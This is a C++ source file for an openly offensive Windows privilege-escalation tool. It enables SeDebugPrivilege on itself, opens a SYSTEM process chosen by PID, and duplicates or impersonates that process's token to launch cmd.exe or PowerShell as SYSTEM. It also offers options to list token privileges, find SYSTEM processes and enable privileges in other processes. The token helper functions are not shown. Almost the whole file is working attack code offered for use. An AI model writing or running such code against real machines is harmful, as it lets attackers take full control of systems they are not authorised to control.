
//Author : Subzero0x9
//Email: subzero0x9@protonmail.com
//Twitter : @subzero0x9

#include <iostream>
#include <Windows.h>
#include <tchar.h>
#include <stdio.h>
#include <wchar.h>
#include "TokenFunctions.h"

#pragma comment(lib, "advapi32.lib")

int wmain(int argc, WCHAR* argv[])
{

	if (argc < 2)
	{
		_tprintf(L"%s [PID] [Options]\n",argv[0]);
		_tprintf(L"[PID] : Specify the PID of a non-protected SYSTEM Process\n");
		_tprintf(L"Options: \n");
		_tprintf(L"-getCMD : Create a New CMD process With Primary Token with SYSTEM Privileges\n");
		_tprintf(L"-impersonate : Elevating the existing thread with Impersonation Token\n");
		_tprintf(L"-getPowershell : Create a New Powershell process with SYSTEM Privileges\n");
		_tprintf(L"-tokeninfo : Gives User and Group Info about the Token\n");
		_tprintf(L"-listPrivileges : List Privileges\n");
		_tprintf(L"-listTokenStats : List the Token Statistics\n");
		_tprintf(L"-findSystem : Finds System Processes currently running. Needs no PID\n");
		_tprintf(L"-checkPrivilege: Check if the Privilege is available\n");
		_tprintf(L"-enableRemotePriv : Enable the Privilege of the Specified Process. In [PID] mention the Process ID for which you want to enable the Privilege\n");
		return TRUE;
	}

	int pid = _wtoi(argv[1]);
	HANDLE hProcess = NULL;


	LPTSTR SeDebugPrivilege = (wchar_t*)SE_DEBUG_NAME;
	LPTSTR SeLoadDriverPrivilege = (wchar_t*)SE_LOAD_DRIVER_NAME;


	if (CheckTokenPrivilege(SeDebugPrivilege) == TRUE)
	{
		_tprintf(L"[-]Privilege is  Enabled for Current Process\n");
	}
	else
	{
		_tprintf(L"[-]Privilege is not Enabled for Current Process\n");
		_tprintf(L"[-]Enabling the Privilege for Current Process\n");
		if (EnableTokenPrivilege(SeDebugPrivilege) == TRUE)
		{
			_tprintf(L"[-]Privilege is Enabled for the Current Process\n");

		}
		else
		{
			_tprintf(L"[-]Cannot Enable privilege for the Current Process\n");
		}
	}

	if (argc == 2)
	{
		if (lstrcmpi(argv[1], TEXT("-findSystem")) == 0)
		{
			FindSystemProc();
		}
		else
		{
			_tprintf(L"Ooops. Invaid Option!!\n");
			exit(0);
		}

	}

	hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
	if (!hProcess)
	{
		_tprintf(L"Cannot Open Process. Failed with Error Code: %d\n", GetLastError());
	}


	if (argc == 3)
	{
		if (lstrcmpi(argv[2], TEXT("-getCMD")) == 0)
		{
			LPCWSTR Application = L"C:\\Windows\\system32\\cmd.exe";
		
			_tprintf(L"[-]CMD Process Creation With Primary Token Started\n");
			if (PrimaryTokenElevation(hProcess, Application) == TRUE)
			{
				_tprintf(L"[-]CMD Process Created Successfully with Primary Token of Process ID:%d\n", pid);
			}
			else
			{
				_tprintf(L"[-]Cannot Create Process with Primary Token of Process ID: %d\n", pid);
			}
			return 0;
		}
		else if (lstrcmpi(argv[2], TEXT("-impersonate")) == 0)
		{
			_tprintf(L"[-]Process Impersonation Elevation With Impersonation Token Started\n");
			if (ImpersonationTokenElevation(hProcess) == TRUE)
			{
				_tprintf(L"[-]Process Successfully Elevated with Impersonation Token of Process ID:%d\n", pid);

			}
			else
			{
				_tprintf(L"[-]Cannot Elevate Process with Impersonation Token of Process ID: %d\n", pid);
			}
			return 0;
		}
		else if (lstrcmpi(argv[2], TEXT("-getPowershell")) == 0)
		{
			LPCWSTR Application = L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
			
			_tprintf(L"[-]Getting Powershell with SYSTEM Privileges");
			if (PrimaryTokenElevation(hProcess, Application) == TRUE)
			{
				_tprintf(L"[-]PowerShell Process Created Successfully with Primary Token of Process ID:%d\n", pid);
			}
			else
			{
				_tprintf(L"[-]Cannot Create Process with Primary Token of Process ID: %d\n", pid);
			}
			return 0;

		}
		else if (lstrcmpi(argv[2], TEXT("-tokeninfo")) == 0)
		{
			_tprintf(L"[-]Token Information:-\n");
			if (TokenInfo(hProcess) == TRUE)
			{
				_tprintf(L"[-]TOKEN INFO SUCCESSFULL\n");
			}
			else
			{
				_tprintf(L"[-]TOKEN INFO FAILED\n");
			}
		}
		else if (lstrcmpi(argv[2], TEXT("-listPrivileges")) == 0)
		{
			_tprintf(L"[-]List Privileges:-\n");
			if (ListPrivileges(hProcess) == TRUE)
			{
				_tprintf(L"[-]List Privileges SUCCESSFULL\n");
			}
			else
			{
				_tprintf(L"[-]List Privileges FAILED\n");
			}
		}
		else if (lstrcmpi(argv[2], TEXT("-listTokenStats")) == 0)
		{
			_tprintf(L"[-]Listing Token Statistics\n");
			if (ListTokenStatistics(hProcess) == TRUE)
			{
				_tprintf(L"[-]List Privileges SUCCESSFULL\n");
			}
			else
			{
				_tprintf(L"[-]List Privileges FAILED\n");
			}
		}
		else if (lstrcmpi(argv[2], TEXT("-checkPrivilege")) == 0)
		{
			_tprintf(L"[-]Checking Privilege for the Remote Process\n");
			_tprintf(L"[-]PID of the Remote Process: %d\n", pid);
			if (CheckTokenPrivilegeRemoteProcess(SeDebugPrivilege, hProcess) == TRUE)
			{
				_tprintf(L"[-]Privilege is Enabled for the Remote Process\n");
			}
			else
			{
				_tprintf(L"[-]Cannot Enable Privilege for the Remote Process\n");
			}
		}
		else if (lstrcmpi(argv[2], TEXT("-enableRemotePriv")) == 0)
		{
			_tprintf(L"[-]Enabling Privilege for the Remote Process\n");
			_tprintf(L"[-]PID of the Remote Process: %d\n", pid);
			if (EnableTokenPrivilegeRemoteProcess(SeDebugPrivilege, hProcess) == TRUE)
			{
				_tprintf(L"[-]Privilege is Enabled for the Remote Process\n");
			}
			else
			{
				_tprintf(L"[-]Cannot Enable Privilege for the Remote Process\n");
			}
		}
		else
		{
			_tprintf(L"Choose a valid Option\n");
			exit(0);
		}

	}
	
	return 0;
}

